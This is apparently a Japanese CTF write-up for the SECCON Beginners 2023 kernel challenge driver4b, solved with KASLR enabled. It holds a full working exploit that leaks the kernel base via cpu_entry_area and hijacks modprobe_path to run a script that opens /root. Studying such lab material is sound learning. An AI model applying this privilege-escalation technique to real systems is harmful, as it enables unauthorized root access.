+++
title = "AARがある時のKASLR Bypass (SECCON Beginners CTF 2023 - driver4b with KASLR)"
date = 2024-03-14

[taxonomies]
tags = ["CTF", "Writeup", "Pwn", "Kernel_Exploitation", "KASLR"]
+++

- 問題ファイル: [SECCON_Beginners_CTF_2023/pwnable/driver4b at main · SECCON/SECCON_Beginners_CTF_2023](https://github.com/SECCON/SECCON_Beginners_CTF_2023/tree/main/pwnable/driver4b)

## まえがき

最近Kernel Exploitationを学び始めて[PAWNYABLE!](https://pawnyable.cafe/)のLK01: Holsteinをv4まで取り組み、何かCTFの問題を解いてみようと思ったので、SECCON Beginners CTF 2023からdriver4bという問題を選んだ。

<!-- more -->

この問題は自明なAARとAAWがある上に、KPTI以外の防衛機構が無効化されており、特にKASLRが無効になっているので、modprobe_pathのアドレスが直ぐに判明し、上書きするだけで解けるというBeginnerに相応しい問題なのだが、フラグに次のようなことが書いてあった。

> `ctf4b{HOMEWORK:Write_a_stable_exploit_with_KASLR_enabled}`

driver4bのWriteupは既に日本語で大量に存在しており新規性の欠片も無いが、こちらの宿題に日本語で言及しているものは少なくとも私が5分ググった限りでは無かったので取り組んだ結果を書くことにした。

## Prerequisite

- Kernel Exploitationに関する基本的な知識
	- PawnyableのHolstein v2ぐらいまで
	- 今回だけに限定すると各防衛機構(特にKASLR)とmodprobe_path

## Writeup

配布されている起動スクリプトはqemuの`-append`オプションに`nokaslr`とついているので、`kaslr`に変更する。

```sh
qemu-system-x86_64 \
    -m 64M \
    -nographic \
    -kernel bzImage \
    -initrd rootfs_updated.cpio \
    -append "console=ttyS0 loglevel=3 oops=panic panic=-1 pti=on kaslr" \
    -no-reboot \
    -cpu kvm64 \
    -monitor /dev/null \
    -net nic,model=virtio \
    -net user \
    -gdb tcp::12345

```

攻略対象となるドライバーのソースコード(`ctf4b.c`)は次のようになっている。

```c
#include "ctf4b.h"
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/cdev.h>
#include <linux/fs.h>
#include <linux/uaccess.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("pwnyaa");
MODULE_DESCRIPTION("SECCON Beginners CTF 2023 Online");

char g_message[CTF4B_MSG_SIZE] = "Welcome to SECCON Beginners CTF 2023!";

/**
 * Open this driver
 */
static int module_open(struct inode *inode, struct file *filp)
{
  return 0;
}

/**
 * Close this driver
 */
static int module_close(struct inode *inode, struct file *filp)
{
  return 0;
}

/**
 * Handle ioctl request
 */
static long module_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)
{
  char *msg = (char*)arg;

  switch (cmd) {
    case CTF4B_IOCTL_STORE:
      /* Store message */
      memcpy(g_message, msg, CTF4B_MSG_SIZE);
      break;

    case CTF4B_IOCTL_LOAD:
      /* Load message */
      memcpy(msg, g_message, CTF4B_MSG_SIZE);
      break;

    default:
      return -EINVAL;
  }

  return 0;
}

static struct file_operations module_fops = {
  .owner = THIS_MODULE,
  .unlocked_ioctl = module_ioctl,
  .open = module_open,
  .release = module_close,
};

static dev_t dev_id;
static struct cdev c_dev;

static int __init module_initialize(void)
{
  if (alloc_chrdev_region(&dev_id, 0, 1, CTF4B_DEVICE_NAME))
    return -EBUSY;

  cdev_init(&c_dev, &module_fops);
  c_dev.owner = THIS_MODULE;

  if (cdev_add(&c_dev, dev_id, 1)) {
    unregister_chrdev_region(dev_id, 1);
    return -EBUSY;
  }

  return 0;
}

static void __exit module_cleanup(void)
{
  cdev_del(&c_dev);
  unregister_chrdev_region(dev_id, 1);
}

module_init(module_initialize);
module_exit(module_cleanup);

```

`module_ioctl`で対応するコードを指定することで、`g_message`に対して読み書きを行っている。この問題はSMAPが無効になっているのでユーザー空間のアドレスを`arg`に渡しても特に落ちるということはない。

ここで、`STORE(addr)` -> `LOAD(buf)`とすれば、`addr`の内容が`buf`に書き込まれる。`addr`をカーネル空間中のアドレス、`buf`をユーザー空間のアプリケーションが制御しているバッファとすれば、ユーザー空間からカーネル空間におけるAARが実現する。

同様にして、`STORE(buf) -> LOAD(addr)`を`buf`がユーザー空間のアプリケーションで自由に書き込み出来るバッファ、`addr`をカーネル空間中のアドレスとすれば、カーネル空間中のアドレスに対してユーザー空間からAAWが出来る。

というわけで、modprobe_pathのアドレスを知っていれば後はAAWでここを書き換えるだけで解けそうなのだが、KASLR有効下ではカーネルのベースアドレスをリークする必要が出てくる。

このドライバーは`memcpy`のサイズに`g_message`のサイズを指定しているため、特にオーバーフローやオーバーリードが出来ることはなく、AAR/Wが出来ること以外には目立った脆弱性が見当たらない。したがって、ベースアドレスをリークするには、このドライバーに関係ない何らかの仕様を突く必要性があるように思える。

とは言え、カーネルのベースアドレスを求めるためにベースアドレスのリークに使えるカーネル空間中[^1]の何らかのアドレスを探すという一見循環しているようなことをしなくてはならず、無理なように見えるのだが色々ググると`cpu_entry_area`と呼ばれる領域は0xfffffe0000000000に固定でマップされるというWriteupが幾つかヒットする(このページの末尾にまとめて記載)。

この領域に格納されている値がどうなっているのかをKASLRを有効にして何度か調べてみた結果、0xfffffe0000000004(`cpu_entry_area+4`)にカーネルのベースアドレスに固定のオフセット(この問題では0x808e00)を足した値が入っていることがわかった(下記はカーネルのベースアドレスが0xffffffffbe200000である場合の例)。

```text
pwndbg> vmmap 0xfffffe0000000000
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
             Start                End Perm     Size Offset File
0xffffe37a40000000 0xffffe37a40200000 rw-p   200000      0 [pt_ffffe37a40000]
►xfffffe0000000000 0xfffffe0000001000 r--p     1000      0 [pt_fffffe0000000] +0x0
0xfffffe4bdf670000 0xfffffe4bdf671000 r--p     1000      0 [pt_fffffe4bdf670]

[QEMU target detected - vmmap result might not be accurate; see `help vmmap`]
pwndbg> x/16gx 0xfffffe0000000000
0xfffffe0000000000:     0xbea08e0000101020      0x00000000ffffffff
0xfffffe0000000010:     0xbea08e0300101380      0x00000000ffffffff
0xfffffe0000000020:     0xbea08e0200101c70      0x00000000ffffffff
0xfffffe0000000030:     0xbea0ee00001012c0      0x00000000ffffffff
0xfffffe0000000040:     0xbea0ee0000101050      0x00000000ffffffff
0xfffffe0000000050:     0xbea08e0000101080      0x00000000ffffffff
0xfffffe0000000060:     0xbea08e0000101290      0x00000000ffffffff
0xfffffe0000000070:     0xbea08e00001010b0      0x00000000ffffffff
pwndbg> x/16gx 0xfffffe0000000000+4
0xfffffe0000000004:     0xffffffffbea08e00      0x0010138000000000
0xfffffe0000000014:     0xffffffffbea08e03      0x00101c7000000000
0xfffffe0000000024:     0xffffffffbea08e02      0x001012c000000000
0xfffffe0000000034:     0xffffffffbea0ee00      0x0010105000000000
0xfffffe0000000044:     0xffffffffbea0ee00      0x0010108000000000
0xfffffe0000000054:     0xffffffffbea08e00      0x0010129000000000
0xfffffe0000000064:     0xffffffffbea08e00      0x001010b000000000
0xfffffe0000000074:     0xffffffffbea08e00      0x001013c000000000
pwndbg>
```

これでベースアドレスのリークができたことから、後はKASLRが無効である本来の問題と同様の解き方が出来る。これについては既に先人のWriteupが大量に見つかる上に、PAWNYABLEにだいたい載っているのでそちらを参照してほしい。

今回は、先にも述べたように(楽なので)modprobe_pathの書き換えで解いた。rootでシェルを取得した方が見栄えが良いが、面倒なのでフラグが存在する`/root`の権限を777にする事で解いたと見做す。

実際に動かしてみると次のようになる。

```txt
Boot took 1.70 seconds

[ Welcome to SECCON Beginners CTF 2023 ]
~ $ cat /root/flag.txt
cat: can't open '/root/flag.txt': Permission denied
~ $ ./exploit
[+] Kernel Base: ffffffffb4a00000
[+] modprobe_path: ffffffffb583a080
/tmp/pwn: line 1: ޭ��: not found
~ $ cat /root/flag.txt
The flag is written here on the remote server.

~ $ 
```

## Code

```c
#include "../src/ctf4b.h"
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

unsigned long cpu_entry_area = 0xfffffe0000000000;
unsigned long kernel_base_offset = 0x808e00;
unsigned long modprobe_path_offset = 0xe3a080;

void fatal(const char *msg) {
  perror(msg);
  exit(1);
}

int main() {
  int fd;

  fd = open("/dev/ctf4b", O_RDWR);
  if (fd == -1)
    fatal("/dev/ctf4b");

  unsigned long buf[CTF4B_MSG_SIZE / 8];

  // base leak
  ioctl(fd, CTF4B_IOCTL_STORE, cpu_entry_area+4);
  ioctl(fd, CTF4B_IOCTL_LOAD, buf);

  unsigned long kernel_base = buf[0] - kernel_base_offset;
  unsigned long modprobe_path_addr = kernel_base + modprobe_path_offset;
  printf("[+] Kernel Base: %lx\n", kernel_base);
  printf("[+] modprobe_path: %lx\n", modprobe_path_addr);


  char cmd[] = "/tmp/a.sh\0";
  memcpy(buf, cmd, sizeof(cmd));

  ioctl(fd, CTF4B_IOCTL_STORE, buf);
  ioctl(fd, CTF4B_IOCTL_LOAD, modprobe_path_addr);

  system("echo -e '#!/bin/sh\nchmod -R 777 /root' > /tmp/a.sh");
  system("chmod +x /tmp/a.sh");
  system("echo -e '\xde\xad\xbe\xef' > /tmp/pwn");
  system("chmod +x /tmp/pwn");
  system("/tmp/pwn");

  close(fd);
  return 0;
}

```

## References

- [Holstein v2: Heap Overflowの悪用 | PAWNYABLE!](https://pawnyable.cafe/linux-kernel/LK01/heap_overflow.html#AAR-AAW%E3%81%AB%E3%82%88%E3%82%8BExploit)
	- AAR/AAWが実現している時の説明
- [Imaginary CTF 2023 has just en - HackMD](https://hackmd.io/@capri/SyQS6Eo9n#Extra-lore-%E2%80%93--kASLR-bypass-via-cpu_entry_area)
- [[ImaginaryCTF 2023 - pwn] window-of-opportunity // ret2school](https://ret2school.github.io/post/iwindow/)
- [hxp | hxp CTF 2022: one_byte writeup](https://hxp.io/blog/99/hxp-CTF-2022-one_byte-writeup/)
	- 最初の3行ぐらいしか読んでいないが、`cpu_entry_area`がKASLRの影響を受けないことを初めて知ったのはここ

---

[^1]: ユーザー空間でも良いがおそらく簡単には見つからないか存在しない
